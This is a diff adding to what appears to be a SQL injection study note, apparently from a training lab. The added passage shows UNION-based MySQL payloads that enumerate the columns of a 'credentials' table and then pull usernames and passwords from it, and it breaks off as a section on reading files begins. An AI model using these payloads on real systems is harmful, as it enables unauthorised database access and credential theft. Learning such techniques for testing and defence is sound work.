@@ -96,4 +96,16 @@ Next, we can query the TABLES table in the INFORMATION_SCHEMA db to enumerate wh
 ```
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 ```
-Finally, we can query what column a table has by
+Finally, we can query what column a table has by accessing the COLUMNS table in the INFORMATION_SCHEMA db, the COLUMN_NAME, TABLE_NAME and TABLE_SCHEMA will tell us all we need to know and the following example extracts all column information in the table credentials:
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+Assume the above query showed us that 2 column, username and password, is inside the table credentials, we can then extract it with our union query:
+```
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+
+Reading Files:
+
+To read files in MySQL, one would need FILE Privilege in order to do so, below is how to gather data to determine if one have enough 
